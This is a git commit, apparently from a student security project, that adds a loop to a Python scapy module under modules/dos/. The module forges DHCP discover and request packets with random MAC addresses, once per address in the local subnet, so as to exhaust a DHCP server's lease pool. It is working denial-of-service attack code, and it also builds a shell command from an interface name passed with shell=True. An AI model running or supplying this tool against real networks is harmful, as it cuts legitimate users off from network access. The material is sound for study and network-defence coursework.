b2bac4d3cf9228799fc7a22c3e72ab7c68cabb28
Niels Van De Ginste <niels.vandeginste@student.ap.be>
2023-11-19 21:34:11 +0100

    add starvation loop

--- modules/dos/starvation_module.py
+++ modules/dos/starvation_module.py
@@ -1,9 +1,8 @@
 from scapy.all import srp, ARP, Ether, IP, UDP, BOOTP, DHCP, sniff, sendp
 from random import randint
 import threading
-def mac_to_bytes(mac_addr: str) -> bytes:
-    # Converts a MAC address string to bytes.
-    return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")
+import ipaddress
+import subprocess
 
 def generate_random_mac():
     # Genereer een random MAC-adres
@@ -12,15 +11,21 @@ def generate_random_mac():
     mac=":".join(map(lambda x: "%02x" % x, mac_int))
     return mac
 
+def mac_to_bytes(mac_addr: str) -> bytes:
+    # Converts a MAC address string to bytes.
+    return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")
+
 def delayed_send(packet, delay):
     # Verstuur een pakket met een delay
     def send_packet(packet):
         sendp(packet)
     threading.Timer(delay, send_packet, [packet]).start()
 
-def packet_callback(packet):
-    # Hier kun je aangepaste logica toevoegen voor het verwerken van elk pakket
-    print(packet.summary())
+def generate_ip_list(interface):
+    network = subprocess.check_output(f"ip -4 -br a show {interface} | awk '{{print $3}}'",shell=True).decode("utf-8").strip()
+    ip_network = ipaddress.ip_network(network, strict=False)
+    ip_list = [str(ip) for ip in ip_network]
+    return ip_list
 
 def wait_for_dhcp_offer(xid):
     def check_up(packet):
@@ -57,7 +62,7 @@ def send_dhcp_discover():
     packet=ethernet_layer/IP_layer/UDP_layer/BOOTP_layer/DHCP_layer
 
     delayed_send(packet, 0.5)
-    sniff(prn=packet_callback, store=0, stop_filter=wait_for_dhcp_offer(BOOTP_layer.xid))
+    sniff(store=0, stop_filter=wait_for_dhcp_offer(BOOTP_layer.xid))
 
 def send_dhcp_request(mac_address, offered_xid, offered_ip, server_identifier):
     ethernet_layer=Ether(dst='ff:ff:ff:ff:ff:ff',src=mac_address)
@@ -68,13 +73,16 @@ def send_dhcp_request(mac_address, offered_xid, offered_ip, server_identifier):
     packet=ethernet_layer/IP_layer/UDP_layer/BOOTP_layer/DHCP_layer
 
     delayed_send(packet, 0.5)
-    sniff(prn=packet_callback, store=0, stop_filter=wait_for_dhcp_ack(offered_xid))
+    sniff(store=0, stop_filter=wait_for_dhcp_ack(offered_xid))
 
+def execute_starve_silly_dhcp_servers(interface):
+        for i in range(1,len(generate_ip_list(interface))):
+            send_dhcp_discover()
+            send_dhcp_request(dhcp_offer[Ether].src, dhcp_offer[BOOTP].xid, dhcp_offer[BOOTP].yiaddr, dhcp_offer[BOOTP].siaddr)
+            
+    
 if __name__ == "__main__":
     global dhcp_leases
     dhcp_leases=[]
-
-    send_dhcp_discover()
-    send_dhcp_request(dhcp_offer[Ether].src, dhcp_offer[BOOTP].xid, dhcp_offer[BOOTP].yiaddr, dhcp_offer[BOOTP].siaddr)
-
+    execute_starve_silly_dhcp_servers("eth0")
     print(dhcp_leases)
